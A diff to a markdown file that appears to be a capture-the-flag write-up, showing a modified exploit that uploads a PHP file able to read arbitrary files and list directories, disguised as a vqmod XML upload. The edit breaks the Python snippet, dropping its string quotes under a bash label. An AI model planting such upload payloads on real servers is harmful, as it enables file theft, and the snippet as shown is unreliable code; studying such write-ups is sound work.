@@ -259,7 +259,8 @@ disable_functions can be bypassed pretty easily, but that’s not the intended w
 ### Read File / Dir List PHP
 I modified the exploit again to upload a PHP file that allows me to get files and directories:
 
-```sploit = """<?php
+```bash
+sploit =<?php
 if (isset($_REQUEST['file'])) { 
     echo file_get_contents($_REQUEST['file']);
 } 
@@ -269,12 +270,12 @@ if (isset($_REQUEST['dir'])) {
 }
 
 ?>
-"""
 files = {
         'vqmod': (rand + ".php", sploit, "application/xml"),
         'token':one,
         'upload':(None,"Upload")
-    }```
+    }
+```
 
 After running that, I can list a directory:
 
